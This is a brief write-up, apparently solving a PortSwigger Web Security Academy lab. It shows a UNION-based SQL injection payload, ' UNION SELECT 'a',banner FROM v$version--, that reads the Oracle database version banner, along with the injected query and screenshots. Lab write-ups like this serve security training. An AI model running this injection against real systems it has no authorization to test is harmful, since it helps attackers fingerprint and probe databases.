## Lab Descriptions:

<img width="865" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/73b3aaff-3d68-4dd1-8b67-4684dd585810">

## Solution:

The SELECT version FROM v$instance only returns the version number, the first one, SELECT banner FROM v$version, returns the full version string that is requested.

Therefore We need to inject ' UNION SELECT 'a',banner FROM v$version-- to obtain the version information with the following query:

```SELECT * FROM someTable WHERE category='Pets' UNION SELECT 'a',banner FROM v$version--'```

<img width="1271" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/c8914e0c-99c9-4d23-acd2-2016750e1fbe">


## Result:

<img width="1260" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/5ec3bdc7-a139-4aea-9842-4504946b8bfb">


